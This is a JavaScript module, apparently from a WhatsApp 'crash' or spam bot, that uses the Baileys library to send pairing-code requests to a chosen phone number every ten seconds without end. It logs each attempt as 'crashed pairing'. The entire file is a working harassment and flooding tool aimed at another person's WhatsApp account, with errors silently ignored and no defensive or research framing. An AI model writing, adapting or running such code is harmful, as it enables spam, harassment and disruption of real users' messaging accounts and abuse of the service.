
const RESET = '\x1b[0m';
const GREEN = '\x1b[1m';
const RED = '\x1b[1m';
const { default: makeWASocket, makeInMemoryStore, Browsers, useMultiFileAuthState } = require("@adiwajshing/baileys");
const pino = require("pino");
const fs = require("fs").promises;

async function pairingCode(q, pasta) {
    const simple = require("./lib/oke.js");
    const store = makeInMemoryStore({ logger: pino().child({ level: "silent", stream: "store" }) });
    const { state, saveCreds } = await useMultiFileAuthState("./pairing/" + pasta);

    const crashpairing = simple({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        version: [2, 3000, 1017531287],
        browser: Browsers.ubuntu("Edge"),
    }, store);

    store.bind(crashpairing.ev);
    crashpairing.public = true;

    crashpairing.ev.on("connection.update", async (update) => {
        if (update.connection === "close") {
        } else if (update.connection === "open") {
            console.log("Spam Sucess ✅");
        }
    });

    crashpairing.ev.on("creds.update", saveCreds);

    setInterval(async () => {
        try {
            let phoneNumber = q.replace(/[^\d]/g, "");
            let code = await crashpairing.requestPairingCode(phoneNumber, "TSK3WMQZ", 5000);
            console.log(`${RED}[ SPAM_PAIRING ]${RESET} ${GREEN}crashed pairing to${RESET} => ${phoneNumber} | ${code}`);
        } catch (err) {}
    }, 9999);

    return crashpairing;
}

module.exports = pairingCode